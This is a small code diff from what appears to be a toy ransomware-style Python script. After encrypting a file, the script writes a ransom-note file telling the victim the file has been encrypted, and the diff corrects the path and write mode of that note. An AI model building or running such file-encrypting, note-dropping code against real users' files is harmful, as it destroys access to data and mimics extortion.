@@ -54,7 +54,7 @@ def main() -> None:
         ramskit.encrypt_file([encrypted], key)
         print("[x] File encrypted. Exiting...")
 
-        with open('look_at_me.txt', 'r') as file:
+        with open(encrypted_path + '\\' + 'look_at_me.txt', 'w') as file:
             file.write(f"Your file {encrypted} has been encrypted. Use -a or --action decrypt in ur CLI.")
 
     elif action == 'decrypt':
